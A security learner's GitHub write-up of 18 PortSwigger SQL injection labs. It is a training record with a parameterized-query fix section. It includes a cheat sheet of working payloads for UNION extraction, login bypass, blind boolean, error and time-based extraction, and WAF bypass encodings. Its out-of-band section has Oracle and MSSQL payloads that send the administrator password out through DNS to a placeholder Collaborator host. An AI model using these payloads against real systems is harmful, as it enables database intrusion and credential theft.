# SQL Injection — 18 Labs, All Completed

![SQL Injection](https://img.shields.io/badge/Category-SQL%20Injection-FF4500?style=for-the-badge&logo=databricks&logoColor=white)
![Labs Completed](https://img.shields.io/badge/Labs%20Completed-18%2F18-00C853?style=for-the-badge&logo=checkmarx&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Expert-9C27B0?style=for-the-badge&logo=target&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-PortSwigger%20Academy-FF6D00?style=for-the-badge&logo=hackaday&logoColor=white)

[Main Repo](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) · [Auth Labs](./AUTHENTICATION/) · [Contact](mailto:gskhalsa6245@gmail.com)

---

Finished all 18 PortSwigger SQLi labs — Apprentice through Expert. Writeups below cover what I actually did in each lab, not the theory. The cheat sheet at the bottom is what I kept open while working through the blind injection labs.

**Time spent:** ~60 hours across the full series  
**Tools:** Burp Suite Pro, SQLMap, Python for a few custom scripts  
**Databases hit:** MySQL, PostgreSQL, Oracle, MSSQL

---

## Labs

### Apprentice — 9/9

These build the foundation. If you skip straight to blind injection without doing UNION labs first, you'll struggle to understand what you're actually looking for in the response.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 1 | [WHERE Clause — Retrieve Hidden Data](./LAB-1-SQL-Injection.md) | Injected `' OR 1=1--` into the category filter. Turns the WHERE into an always-true condition — got back all rows including ones the app was hiding. Confirmed by the jump in product count. | In-Band |
| 2 | [Login Bypass](./LAB-2-SQL-Injection.md) | Entered `administrator'--` as the username. Closes the string, comments out the password check entirely. Server just matched on username. Got admin without touching the password field. | Auth Bypass |
| 3 | [UNION — Determine Column Count](./LAB-3-SQL-Injection.md) | Incremented `ORDER BY` until I hit an error at 3 — so 2 columns. Cross-checked with `UNION SELECT NULL,NULL--`. Always do both, ORDER BY can behave differently depending on the DB. | UNION |
| 4 | [UNION — Find String Columns](./LAB-4-SQL-Injection.md) | 2 columns confirmed. Swapped NULLs for `'test'` one at a time. Second column reflected the string back. You need at least one string column before you can pull real data. | UNION |
| 5 | [UNION — Retrieve Data from Other Tables](./LAB-5-SQL-Injection.md) | Both columns string-compatible. `UNION SELECT username,password FROM users--` — credentials dumped straight into the product listing. Plain text. | UNION |
| 6 | [UNION — Multiple Values in Single Column](./LAB-6-SQL-Injection.md) | Only one usable column this time. Concatenated with `username\|\|'~'\|\|password` — tilde as a delimiter so I could split it client-side. Got everything in one shot. | UNION |
| 7 | [DB Version — Oracle](./LAB-7-SQL-Injection.md) | Oracle needs `FROM dual` in every SELECT — trips people up if they're used to MySQL. `UNION SELECT BANNER,NULL FROM v$version--` returned the full version banner. | Fingerprinting |
| 8 | [DB Version — MySQL/MSSQL](./LAB-8-SQL-Injection.md) | `UNION SELECT @@version,NULL#` — MySQL needs `#` or a space after `--` for comment syntax, not just `--`. Got the version string, confirmed the DB engine. | Fingerprinting |
| 9 | [List DB Contents — non-Oracle](./LAB-9-SQL-Injection.md) | Queried `information_schema.tables` for table names, then `information_schema.columns` once I had the users table name. Final payload dumped credentials. Straightforward but easy to mess up if the table name has a random suffix — it did. | Enumeration |

---

### Practitioner — 8/8

This is where it actually gets interesting. No data in the response means you have to read the application's behaviour as a signal — a status code, a delay, a DNS ping. Labs 11–16 took the most time by far.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 10 | [List DB Contents — Oracle](./LAB-10-SQL-Injection.md) | Oracle doesn't have `information_schema`. Used `all_tables` and `all_columns` instead. Same end result — just different catalog syntax. Worth knowing cold if you're doing Oracle engagements. | Enumeration |
| 11 | [Blind — Conditional Responses](./LAB-11-SQL-Injection.md) | Injected into the TrackingId cookie. `AND 1=1--` kept "Welcome back" in the response. `AND 1=2--` removed it. Used that as a boolean oracle to pull the password one character at a time with `SUBSTRING`. Intruder Cluster Bomb to automate it — response length was the differentiator. | Blind Boolean |
| 12 | [Blind — Conditional Errors](./LAB-12-SQL-Injection.md) | No page difference on true/false. Switched to error-based oracle — division by zero in a CASE expression on Oracle. True condition = 500 error, false = 200. HTTP status becomes your data channel. Same char-by-char extraction with Intruder, filtering on response code instead of length. | Blind Error |
| 13 | [Blind — Time Delays](./LAB-13-SQL-Injection.md) | Nothing in the response at all — not even a status code difference. `'; SELECT pg_sleep(10)--` caused a 10s hang. That confirmed both the injection point and that it was PostgreSQL. No extraction yet, just confirming the channel exists. | Blind Time |
| 14 | [Blind — Time Delays + Data Exfiltration](./LAB-14-SQL-Injection.md) | Built on Lab 13. Conditional sleep: `CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END`. One thread in Intruder's Resource Pool — if you run concurrent threads the timing breaks and you get garbage. Slow but it works. | Blind Time |
| 15 | [Blind — OOB Interaction](./LAB-15-SQL-Injection.md) | App was processing the query async. No boolean signal, no timing signal. Dropped an Oracle XXE payload pointing at a Burp Collaborator subdomain. Got a DNS hit back. That's your confirmation — the DB can reach out. | Blind OOB |
| 16 | [Blind — OOB Data Exfiltration](./LAB-16-SQL-Injection.md) | Extended Lab 15. Embedded the password query inside the DNS lookup itself — `(SELECT password FROM users WHERE username='administrator')` as a subdomain prefix. Collaborator received the lookup with the password in the hostname. Read it straight from the interaction log. | Blind OOB |
| 17 | [Filter Bypass via XML Encoding](./LAB-17-SQL-Injection.md) | WAF was blocking SQLi keywords in the request body. Payload was inside an XML parameter. Hex-encoded the keywords — `&#x53;ELECT` instead of `SELECT`. WAF didn't decode before matching. The XML parser on the backend did. Payload executed cleanly. | WAF Bypass |

---

### Expert — 1/1

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 18 | [Visible Error-Based SQLi](./LAB-18-SQL-Injection.md) | Verbose errors were on. Injected `AND 1=CAST((SELECT username FROM users LIMIT 1) AS integer)--`. PostgreSQL tries to cast the string to int, fails, and throws the value back in the error message. Did the same with the password column. No blind technique needed — the DB just handed it over. | Error Based |

---

## Techniques

### UNION Injection

Before you can pull data, you need to know the column count and which columns reflect text. Both steps are non-negotiable — get either wrong and UNION fails silently or throws an error that misleads you.

```sql
-- Column count via ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error here = 2 columns

-- Verify with UNION (NULLs are type-safe)
' UNION SELECT NULL,NULL--

-- Find string columns (swap NULLs one at a time)
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--

-- Pull data
' UNION SELECT username,password FROM users--

-- Only one string column available? Concatenate
' UNION SELECT NULL,username||'~'||password FROM users--
```

Version fingerprinting by DB:

```sql
' UNION SELECT BANNER,NULL FROM v$version--      -- Oracle
' UNION SELECT @@version,NULL--                  -- MySQL, MSSQL
' UNION SELECT version(),NULL--                  -- PostgreSQL
```

---

### Boolean Blind

The page has two states — something changes when your condition is true vs false. That's all you need. You ask yes/no questions and read the answer from the page.

```sql
-- Establish the oracle
' AND 1=1--    -- normal page
' AND 1=2--    -- something changes (message disappears, element missing, length diff)

-- Confirm the table exists before wasting time extracting
' AND (SELECT 'x' FROM users LIMIT 1)='x'--

-- Extract char by char (Intruder automates this)
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--

-- Automate: Cluster Bomb attack in Intruder
-- Position 1 = character index (1-20)
-- Position 2 = character value (a-z, 0-9, A-Z)
-- Differentiator: response length
```

---

### Time-Based Blind

When there's genuinely nothing to read in the response — no length diff, no status diff — timing is the last resort. Works well, just slow.

```sql
-- Confirm the channel first (flat delay, no condition)
'; SELECT pg_sleep(10)--                                           -- PostgreSQL
'; SELECT SLEEP(10)--                                              -- MySQL
'; WAITFOR DELAY '0:0:10'--                                        -- MSSQL
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual--          -- Oracle

-- Conditional delay for extraction (PostgreSQL)
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a')
   THEN pg_sleep(5) ELSE pg_sleep(0) END
   FROM users WHERE username='administrator'--

-- Important: 1 thread only in Intruder Resource Pool
-- Multiple threads destroy timing accuracy
```

---

### Out-of-Band Exfiltration

Used when the app processes queries asynchronously and you get zero feedback — no boolean, no timing. Make the DB initiate a DNS request carrying your data as a subdomain.

```sql
-- Oracle (Burp Collaborator) — data exfil via DNS
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM
"http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual--

-- MSSQL — xp_dirtree DNS lookup
'; exec master..xp_dirtree '//'+(SELECT password FROM users WHERE username='administrator')+'.YOUR-COLLABORATOR-ID.oastify.com/a'--

-- Check Collaborator for incoming DNS — the subdomain prefix is your value
```

---

### WAF Bypass — XML Encoding

If you're injecting into an XML parameter and getting blocked, hex entity encoding is usually the first thing to try. Most WAFs match on raw keyword strings pre-decode.

```xml
<!-- Instead of SELECT, use hex entities -->
<storeId>1 &#x55;NION &#x53;ELECT NULL--</storeId>

<!-- WAF sees: 1 &#x55;NION &#x53;ELECT NULL-- (no keyword match) -->
<!-- Backend XML parser decodes it before the query runs -->
```

Other bypass approaches worth knowing:

```
Case variation:          uNiOn SeLeCt
Comment insertion:       UN/**/ION SEL/**/ECT   (MySQL)
Whitespace substitution: UNION%09SELECT         (tab)
Double URL encoding:     %2527 → '
```

---

### Error-Based Extraction

When verbose errors are enabled, you can skip blind techniques entirely. Force a type mismatch — the DB fails to cast your string to an integer and includes the actual value in the error message.

```sql
-- PostgreSQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS integer)--
-- Returns: ERROR: invalid input syntax for type integer: "actualpasswordhere"

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

-- Oracle
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE username='administrator'))--
```

---

## DB Reference

### Enumerating Schema

```sql
-- MySQL / PostgreSQL / MSSQL
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle (no information_schema)
SELECT table_name FROM all_tables
SELECT column_name FROM all_columns WHERE table_name='USERS'
```

### Concatenation

| DB | Syntax |
|----|--------|
| Oracle | `'a'\|\|'b'` |
| MSSQL | `'a'+'b'` |
| PostgreSQL | `'a'\|\|'b'` |
| MySQL | `CONCAT('a','b')` |

### Comments

| DB | Style |
|----|-------|
| MySQL | `--` or `#` (note: `--` needs trailing space) |
| MSSQL | `--` |
| PostgreSQL | `--` |
| Oracle | `--` |

---

## Fix

Parameterized queries. That's it. Everything else — input validation, WAFs, error suppression — is layered on top and none of it substitutes for this.

```python
# Don't do this
query = "SELECT * FROM products WHERE category = '" + category + "'"

# Do this
query = "SELECT * FROM products WHERE category = %s"
cursor.execute(query, (category,))
```

```javascript
// Node.js
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND password = $2',
  [username, password]
);
```

```java
// Java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, category);
```

Beyond that: least-privilege DB accounts (app user shouldn't have DROP), generic error messages to users, and WAF rules as a detection layer — not a prevention strategy.

---

## Tools

| Tool | What I used it for |
|------|--------------------|
| Burp Suite Pro | Everything — Repeater for manual testing, Intruder for blind extraction automation |
| SQLMap | Verification after manual exploitation, `--level=5 --risk=3` for thorough coverage |
| Burp Collaborator | OOB interaction and DNS exfiltration (Labs 15-16) |
| Python | Custom timing scripts where Intruder's thread control wasn't granular enough |

---

## Lab Order Recommendation

Do UNION labs (1–9) before anything else. The blind labs assume you already understand what you're looking for when there *is* data in the response — without that baseline, blind injection concepts don't click properly.

Labs 11–16 are the hardest part of this series, mostly because of the mindset shift. There's nothing to look at — you're inferring everything from a page state, an HTTP status, a response time, or a DNS packet. It takes a while to trust that.

Labs 17 and 18 are short. Both rely on understanding how layers of parsing work — WAF vs XML parser in 17, verbose errors in 18. More about knowing the environment than complex exploitation.

---

## Completion

- [x] Lab 1 — WHERE Clause Hidden Data
- [x] Lab 2 — Login Bypass
- [x] Lab 3 — UNION Column Count
- [x] Lab 4 — UNION String Columns
- [x] Lab 5 — UNION Data Extraction
- [x] Lab 6 — UNION Single Column Concat
- [x] Lab 7 — Version Fingerprint (Oracle)
- [x] Lab 8 — Version Fingerprint (MySQL/MSSQL)
- [x] Lab 9 — Schema Enumeration (non-Oracle)
- [x] Lab 10 — Schema Enumeration (Oracle)
- [x] Lab 11 — Blind Boolean
- [x] Lab 12 — Blind Conditional Error
- [x] Lab 13 — Blind Time Delay
- [x] Lab 14 — Blind Time + Extraction
- [x] Lab 15 — Blind OOB Interaction
- [x] Lab 16 — Blind OOB Exfiltration
- [x] Lab 17 — WAF Bypass XML Encoding
- [x] Lab 18 — Visible Error-Based

---

## Resources

- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) — keep this open during blind labs
- [OWASP SQLi Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89](https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-89)

Other series in this repo:
- [Authentication Vulnerabilities](./AUTHENTICATION/) — 14 labs done
- XSS — in progress
- Access Control — in progress

---

## Legal

All of this was done on PortSwigger Academy's lab environment. Using these techniques against systems you don't own or don't have written permission to test is illegal in most jurisdictions and not something I'd document here if I did it.

---

*Gurpreet Singh — [GitHub](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) · [LinkedIn](https://www.linkedin.com/in/gurpreetsingh-security) · [Email](mailto:gskhalsa6245@gmail.com)*

*CC BY-NC-ND 4.0 — © 2025 Gurpreet Singh*
